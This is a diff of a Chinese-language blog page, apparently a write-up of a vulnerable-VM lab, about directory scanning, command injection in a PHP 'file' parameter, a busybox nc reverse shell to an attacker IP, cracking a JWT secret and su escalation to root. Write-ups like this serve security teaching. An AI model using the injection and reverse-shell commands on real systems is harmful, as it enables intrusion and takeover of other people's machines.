@@ -385,7 +385,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  471
+                  473
                 </span>
               
 
@@ -427,18 +427,22 @@
 <p>使用github上的<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>来扫描目录（我用kali自带的dirb没有扫到），发现<code>text.php</code>。</p>
 <p>访问并点击链接，关注<code>url：http://192.168.43.83/test.php?file=last.html</code>。</p>
 <ul>
-<li>猜测1：正常的文件访问<ul>
+<li>猜测1：正常的文件访问
+<ul>
 <li>file参数改成/etc/passwd，访问失败</li>
 </ul>
 </li>
-<li>猜测2：命令执行，通过cat之类的命令来访问，命令之间用分号分隔<ul>
+<li>猜测2：命令执行，通过cat之类的命令来访问，命令之间用分号分隔
+<ul>
 <li>file参数为file=last.html;whoami访问失败</li>
-<li>file参数为file=last.html;id访问成功<br>但是在尝试反弹<code>shell（nc、/bin/nc、netcat、/bin/netcat）</code>的时候失败了，这里有一个<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">绕过安全策略的网站</a>，收集了执行命令的方法。</li>
+<li>file参数为file=last.html;id访问成功<br>
+但是在尝试反弹<code>shell（nc、/bin/nc、netcat、/bin/netcat）</code>的时候失败了，这里有一个<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">绕过安全策略的网站</a>，收集了执行命令的方法。</li>
 </ul>
 </li>
 </ul>
 <p>于是<code>file=a;busybox nc 192.169.43.211 4444 -e /bin/sh -i</code>，同时攻击机上运行<code>nc -lvp 4444</code></p>
-<p>然后拿到了shell,进入<code>/home/bob</code>目录发现<code>._pw_</code>文件，里面有一串<code>jwt</code><a href="https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/" target="_blank" rel="noopener">josn web<br>tocken</a>,然后github上有一个脚本来破解其中的secret-key：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">工具链接</a>,跑完后得到<code>secretkey</code>。</p>
+<p>然后拿到了shell,进入<code>/home/bob</code>目录发现<code>._pw_</code>文件，里面有一串<code>jwt</code><a href="https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/" target="_blank" rel="noopener">josn web<br>
+tocken</a>,然后github上有一个脚本来破解其中的secret-key：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">工具链接</a>,跑完后得到<code>secretkey</code>。</p>
 <hr>
 <p>从这里开始涉及知识盲区了，尝试用<code>secretkey</code>去登陆<code>bob</code>和<code>root</code>（这个有点脑洞）。但是这不是<code>tty shell</code>，所以不能直接执行su命令，因为会让你输入密码。</p>
 <p>考虑到权限的问题，将目录切换到<code>/tmp</code>下，在这里所有用户都有完整的读写权限。然后执行<code>script -c &quot;/bin/bash&quot;</code>,这样就来到了<code>bash</code>环境中，然后用<code>su</code>命令，能成功登陆root用户，提权成功。</p>
@@ -553,7 +557,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -715,7 +719,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59.7k</span>
+    <span title="Site words total count">61.5k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
